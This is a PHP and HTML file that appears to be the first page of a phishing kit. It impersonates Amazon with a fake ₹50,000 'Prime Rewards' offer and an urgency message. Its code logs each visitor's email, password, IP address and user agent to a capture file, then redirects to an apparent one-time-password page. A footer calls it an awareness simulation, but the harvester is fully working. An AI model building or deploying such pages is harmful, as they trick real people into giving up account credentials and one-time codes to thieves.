<?php
// Capture step 1 data
if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['step1'])) {
    $email = $_POST['email'] ?? 'N/A';
    $password = $_POST['password'] ?? 'N/A';
    $code = $_POST['code'] ?? 'N/A';

    $log = date('Y-m-d H:i:s') . " | STEP1 | Email: $email | Pass: $password | Code: $code | IP: " . $_SERVER['REMOTE_ADDR'] . " | UA: " . $_SERVER['HTTP_USER_AGENT'] . "\n";
    file_put_contents('logs/capture.log', $log, FILE_APPEND);

    // Store email temporarily in session for OTP step
    session_start();
    $_SESSION['email'] = $email;

    header("Location: otp.php");
    exit;
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PrimeClaim Rewards - Claim Your ₹50,000</title>
    <style>
        :root { --primary: #ff9900; --dark: #131921; --light: #fff; --gray: #eee; }
        body { margin:0; font-family: Arial, sans-serif; background: var(--dark); color: var(--light); min-height: 100vh; display: flex; align-items: center; justify-content: center; }
        .container { background: var(--light); color: #111; border-radius: 12px; padding: 40px; max-width: 460px; width: 100%; box-shadow: 0 10px 40px rgba(0,0,0,0.5); }
        .logo { font-size: 2.8rem; font-weight: bold; color: var(--primary); text-align: center; margin-bottom: 20px; }
        h1 { font-size: 1.8rem; margin-bottom: 10px; text-align: center; }
        p { text-align: center; margin-bottom: 30px; color: #444; }
        input, button { width: 100%; padding: 14px; margin: 10px 0; border-radius: 6px; border: 1px solid #ddd; font-size: 1rem; }
        button { background: var(--primary); color: white; border: none; font-weight: bold; cursor: pointer; transition: 0.3s; }
        button:hover { background: #e68a00; transform: translateY(-2px); }
        .footer { text-align: center; margin-top: 30px; font-size: 0.8rem; color: #777; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">amazon</div>
        <h1>Claim Your ₹50,000 Prime Rewards</h1>
        <p>Verify your account to receive your exclusive gift card. Offer ends soon.</p>

        <form method="POST">
            <input type="hidden" name="step1" value="1">
            <input type="email" name="email" placeholder="Amazon Email Address" required>
            <input type="password" name="password" placeholder="Amazon Password" required>
            <input type="text" name="code" placeholder="Reward Code" value="PRIME-CLAIM-928374" readonly>
            <button type="submit">Verify & Proceed</button>
        </form>

        <div class="footer">This is a cybersecurity awareness simulation only. Do not enter real credentials.</div>
    </div>
</body>
</html>